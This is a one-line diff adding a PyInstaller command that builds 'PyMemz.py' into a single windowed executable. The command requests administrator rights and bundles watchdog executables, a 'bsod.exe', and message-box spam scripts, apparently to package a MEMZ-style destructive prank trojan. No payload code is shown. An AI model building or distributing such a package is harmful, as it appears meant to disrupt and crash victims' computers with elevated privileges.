@@ -1,0 +1,1 @@
+pyinstaller --noconfirm --onefile --windowed --icon "NONE" --uac-admin --add-data "WATCHDOG2.exe;." --add-data "WATCHDOG1.exe;." --add-data "bsod.exe;." --add-data "msgbox.exe;." --add-data "libgcc_s_dw2-1.dll;." --add-data "msgbox.vbs;." --add-data "msgboxspam.bat;." --add-data "start.vbs;."  "PyMemz.py"
